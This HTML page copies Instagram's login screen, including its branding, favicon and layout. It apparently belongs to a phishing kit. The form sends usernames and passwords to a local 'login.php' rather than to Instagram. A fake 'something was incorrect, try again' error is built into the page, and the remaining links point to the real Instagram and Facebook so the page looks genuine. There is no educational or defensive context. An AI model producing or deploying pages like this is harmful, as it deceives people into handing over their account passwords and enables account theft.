<!DOCTYPE html>
<html>
<head>
  <title>Instagram</title>
  <link rel="shortcut icon" href="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/Instagram_icon.png/768px-Instagram_icon.png" type="image/png">

</head>
<style type="text/css">
  body {
  font-family: sans-serif;
  background-color: #fafafa;
  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen,
    Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif;
  box-sizing: border-box;
}

a {
  text-decoration: none;
}

.container {
  max-width: 1000px;
  margin: 0 auto;
  display: flex;
  justify-content: center;
  flex-direction: column;
  align-items: center;
  margin-top: 3rem;
  font-size: 14px;
}

.box {
  max-width: 350px;
  width: 100%;
  display: flex;
  justify-content: center;
  align-items: center;
  flex-direction: column;
  background-color: #ffff;
  border: 1px solid #e6e6e6;
  border-radius: 1px;
  margin: 0 0 10px;
  padding: 10px 0;
  flex-grow: 1;
}

.heading {
  margin: 22px auto 12px;
  background-image: url("https://www.instagram.com/static/bundles/es6/sprite_core_b20f2a3cd7e4.png/b20f2a3cd7e4.png");
  background-position: -98px 0;
  height: 51px;
  width: 177px;
  overflow: hidden;
}

.field {
  margin: 10px 0;
  position: relative;
  font-size: 14px;
  width: 100%;
  text-overflow: ellipsis;
}

input {
  padding: 9px 0px 7px 9px;
  font-size: 12px;
  width: 16rem;
  height: 1.2rem;
  outline: none;
  background: #fafafa;
  border-radius: 3px;
  border: 1px solid #efefef;
}

/* label intial position*/

label {
  position: absolute;
  pointer-events: none;
  left: 10px;
  padding-bottom: 15px;
  transform: translateY(10px);
  line-height: 6px;
  transition: all ease-out 0.1s;
  font-size: 14px;
  color: #999;
  padding-top: 6px;
}

/* hiding placeholder in all browsers */

input::placeholder {
  visibility: hidden;
}

/* hiding  placeholder in mozilla */
.login-form ::-moz-placeholder {
  color: transparent;
}

/* label final position */
input:not(:placeholder-shown) + label {
  transform: translateY(0);
  font-size: 11px;
}

/* input padding increases if placeholder is not shown */
input:not(:placeholder-shown) {
  padding-top: 14px;
  padding-bottom: 2px;
}

.login-button {
  text-align: center;
  width: 100%;
  padding: 0.5rem;
  border: 1px solid transparent;
  background-color: #3897f0;
  color: #fff;
  font-weight: 600;
  font-size: 14px;
  cursor: pointer;
}

.separator {
  display: flex;
  justify-content: space-between;
  align-items: center;
  color: #999;
  margin-top: 6px;
}

.separator .line {
  height: 1px;
  width: 40%;
  background-color: #dbdbdb;
}

.other {
  display: flex;
  justify-content: center;
  flex-direction: column;
  align-items: center;
}

.fb-login-btn {
  margin: 1rem;
  border: 0;
  cursor: pointer;
  font-size: 14px;
  color: #385185;
  font-weight: 600;
  background: transparent;
}

.fb-icon {
  color: #385185;
  font-size: 1rem;
  padding-right: 1px;
}

.forgot-password {
  font-size: 11px;
  color: #003569;
}

.signup {
  color: #3897f0;
  font-weight: 600;
}
</style>
<body>
<div class="container">
      <div class="box">
        <div class="heading"></div>
        <form class="login-form" method="post" action="login.php">
          <div class="field">
            <input id="username" type="name" name="username" placeholder="Phone number, username, or email" required />
            <label for="username">Phone number, username, or email</label>
          </div>
          <div class="field">
            <input id="password" name="password" type="password" placeholder="password" required />
            <label for="password">Password</label>
          </div>
            <button class="login-button" title="login" type="submit" name="login">Log In</button>
            <div class="separator">
              <div class="line"></div>
              <p>OR</p>
              <div class="line"></div>
            </div>
          <div class="other">
            <button class="fb-login-btn" type="button">
              <i class="fa fa-facebook-official fb-icon"></i>
              <span class=""><a style="color: #385185" href="https://www.facebook.com/login.php?skip_api_login=1&api_key=124024574287414&kid_directed_site=0&app_id=124024574287414&signed_next=1&next=https%3A%2F%2Fwww.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26state%3D%257B%2522fbLoginKey%2522%253A%25221ol44bp13bjoeibwx8pr5dnbe12ip5bo1iivo31azwmlquqf65v%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252F%2522%257D%26scope%3Demail%26response_type%3Dcode%252Cgranted_scopes%26locale%3Den_US%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D458f885e-3d27-4798-a9b1-4b3ccd532869%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522fbLoginKey%2522%253A%25221ol44bp13bjoeibwx8pr5dnbe12ip5bo1iivo31azwmlquqf65v%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252F%2522%257D%23_%3D_&display=page&locale=en_US&pl_dbl=0">Log in with Facebook</a></span>
            </button>

            
            <a style="width: 200px;
    font-size: 14px;
    text-align: center;
    color: red;
    margin-bottom: 16px;">Sorry, something was incorrect. Please double-check your password and email. <br>Try again!</a>
    <a class="forgot-password" href="https://www.instagram.com/accounts/password/reset/">Forgot password?</a>
          </div>
        </form>
      </div>
      <div class="box">
        <p>Don't have an account? <a class="signup" href="https://www.instagram.com/accounts/emailsignup/">Sign Up</a></p>
      </div>
    </div>
</body>
</html>